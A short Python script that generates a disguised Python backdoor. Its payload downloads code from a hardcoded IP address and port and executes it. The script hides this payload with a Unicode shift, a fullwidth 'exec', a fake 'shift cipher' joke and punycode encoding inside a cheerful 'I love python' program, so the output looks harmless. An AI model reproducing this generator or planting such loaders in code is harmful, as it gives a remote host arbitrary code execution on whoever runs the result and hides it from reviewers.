#!/usr/bin/env python	


PAYLOAD = """import urllib.request as o
exec(o.urlopen("http://62.171.182.100:1337/bd").read().decode())#"""

def encode_payload(p):
    s = ""
    for c in p:
        s += chr(0xfa00 + ord(c) + 5)
    return s

c = """

I="I"
love="love"
python="python"

print(I, love, python)

# shift cipher!
def shift_cipher(s, key):
    return ｅｘｅｃ("".join(chr((ord(c) + key) % 128) for c in s))

# this string is super secret, so I encrypted it!
secret="PAYLOADymnx%nx%f%xjhwjy%rjxxflj&"

print(shift_cipher(secret, -5))

# I love python comments, so I put one more here with some crap <3:
# here is some crap: """.replace("PAYLOAD", encode_payload(PAYLOAD))

print("#They say codying is fun, but I like puns, so when I code, coding!=funnycode, but coding=punycode! ... anyways, here is some nice python code :)"  + c.encode("punycode").decode(), end = "")
